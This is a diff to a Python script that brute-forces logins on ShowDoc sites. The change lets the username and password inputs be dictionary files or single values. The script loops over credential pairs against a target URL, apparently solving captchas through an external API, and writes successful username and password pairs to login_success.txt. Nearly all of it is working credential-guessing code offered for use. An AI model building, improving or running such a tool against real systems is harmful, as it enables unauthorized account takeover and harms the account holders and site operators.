@@ -37,9 +37,13 @@ def check_params():
         if os.path.exists(args.u) and os.path.getsize(args.u) != 0:
             if os.path.exists(args.p) and os.path.getsize(args.p) != 0:
                 return True
+            elif args.p != '':
+                return True
             else:
                 print(Fore.RED + '[-] Password dictionary is not specified or the content is empty!')
                 sys.exit()
+        elif args.u != '':
+            return True
         else:
             print(Fore.RED + '[-] Username dictionary is not specified or the content is empty!')
             sys.exit()
@@ -198,23 +202,48 @@ def showdoc_login_main(showdoc_url, username, password, captcha_api_url):
 
 def run():
     if check_params():
-        user_list = file_to_list(filename=args.u)
-        pass_list = file_to_list(filename=args.p)
-        user_total = len(user_list)
-        pass_total = len(pass_list)
-        total = user_total * pass_total
-        showdoc_url = handle_target(target=args.t)
-        if args.c != '':
-            captcha_api_url = handle_target(target=args.c)
-        else:
-            captcha_api_url = ''
-        print(Fore.WHITE + f'[+] Read the total number of usernames:', end='')
-        print(Fore.GREEN + f'{user_total}')
-        print(Fore.WHITE + f'[+] Read the total number of passwords:', end='')
-        print(Fore.GREEN + f'{pass_total}')
-        for u_index, username in enumerate(user_list):
+        if os.path.exists(args.u) and os.path.exists(args.p):
+            user_list = file_to_list(filename=args.u)
+            pass_list = file_to_list(filename=args.p)
+            user_total = len(user_list)
+            pass_total = len(pass_list)
+            total = user_total * pass_total
+            showdoc_url = handle_target(target=args.t)
+            if args.c != '':
+                captcha_api_url = handle_target(target=args.c)
+            else:
+                captcha_api_url = ''
+            print(Fore.WHITE + f'[+] Read the total number of usernames:', end='')
+            print(Fore.GREEN + f'{user_total}')
+            print(Fore.WHITE + f'[+] Read the total number of passwords:', end='')
+            print(Fore.GREEN + f'{pass_total}')
+            for u_index, username in enumerate(user_list):
+                for p_index, password in enumerate(pass_list):
+                    progress = round((((u_index * pass_total) + p_index + 1) * 100 )/ total, 2)
+                    print(Fore.WHITE + f'[{progress}%] Try to log in:{username}/{password}')
+                    login_res_code, login_res_msg = showdoc_login_main(showdoc_url, username, password, captcha_api_url)
+                    if login_res_code == 0:
+                        print(Fore.WHITE + '[*] Login successful! username:', end='')
+                        print(Fore.GREEN + f'{username}', end='')
+                        print(Fore.WHITE + ' password:', end='')
+                        print(Fore.GREEN + f'{password}')
+                        logger(filename='login_success.txt', io_type='a', string=f'[{showdoc_url}/] {username}/{password}\n')
+                        break
+        elif not os.path.exists(args.u) and os.path.exists(args.p):
+            username = args.u
+            pass_list = file_to_list(filename=args.p)
+            pass_total = len(pass_list)
+            showdoc_url = handle_target(target=args.t)
+            if args.c != '':
+                captcha_api_url = handle_target(target=args.c)
+            else:
+                captcha_api_url = ''
+            print(Fore.WHITE + f'[+] Username:', end='')
+            print(Fore.GREEN + f'{username}')
+            print(Fore.WHITE + f'[+] Read the total number of passwords:', end='')
+            print(Fore.GREEN + f'{pass_total}')
             for p_index, password in enumerate(pass_list):
-                progress = round((((u_index * pass_total) + p_index + 1) * 100 )/ total, 2)
+                progress = round(((p_index + 1) * 100) / pass_total, 2)
                 print(Fore.WHITE + f'[{progress}%] Try to log in:{username}/{password}')
                 login_res_code, login_res_msg = showdoc_login_main(showdoc_url, username, password, captcha_api_url)
                 if login_res_code == 0:
@@ -224,8 +253,49 @@ def run():
                     print(Fore.GREEN + f'{password}')
                     logger(filename='login_success.txt', io_type='a', string=f'[{showdoc_url}/] {username}/{password}\n')
                     break
-
-
+        elif os.path.exists(args.u) and not os.path.exists(args.p):
+            user_list = file_to_list(filename=args.u)
+            password = args.p
+            user_total = len(user_list)
+            showdoc_url = handle_target(target=args.t)
+            if args.c != '':
+                captcha_api_url = handle_target(target=args.c)
+            else:
+                captcha_api_url = ''
+            print(Fore.WHITE + f'[+] Read the total number of usernames:', end='')
+            print(Fore.GREEN + f'{user_total}')
+            print(Fore.WHITE + f'[+] Password:', end='')
+            print(Fore.GREEN + f'{password}')
+            for u_index, username in enumerate(user_list):
+                progress = round(((u_index + 1) * 100) / user_total, 2)
+                print(Fore.WHITE + f'[{progress}%] Try to log in:{username}/{password}')
+                login_res_code, login_res_msg = showdoc_login_main(showdoc_url, username, password, captcha_api_url)
+                if login_res_code == 0:
+                    print(Fore.WHITE + '[*] Login successful! username:', end='')
+                    print(Fore.GREEN + f'{username}', end='')
+                    print(Fore.WHITE + ' password:', end='')
+                    print(Fore.GREEN + f'{password}')
+                    logger(filename='login_success.txt', io_type='a', string=f'[{showdoc_url}/] {username}/{password}\n')
+        else:
+            username = args.u
+            password = args.p
+            showdoc_url = handle_target(target=args.t)
+            if args.c != '':
+                captcha_api_url = handle_target(target=args.c)
+            else:
+                captcha_api_url = ''
+            print(Fore.WHITE + f'[+] Username:', end='')
+            print(Fore.GREEN + f'{username}')
+            print(Fore.WHITE + f'[+] Password:', end='')
+            print(Fore.GREEN + f'{password}')
+            print(Fore.WHITE + f'[+] Try to log in:{username}/{password}')
+            login_res_code, login_res_msg = showdoc_login_main(showdoc_url, username, password, captcha_api_url)
+            if login_res_code == 0:
+                print(Fore.WHITE + '[*] Login successful! username:', end='')
+                print(Fore.GREEN + f'{username}', end='')
+                print(Fore.WHITE + ' password:', end='')
+                print(Fore.GREEN + f'{password}')
+                logger(filename='login_success.txt', io_type='a', string=f'[{showdoc_url}/] {username}/{password}\n')
 
 
 if __name__ == '__main__':
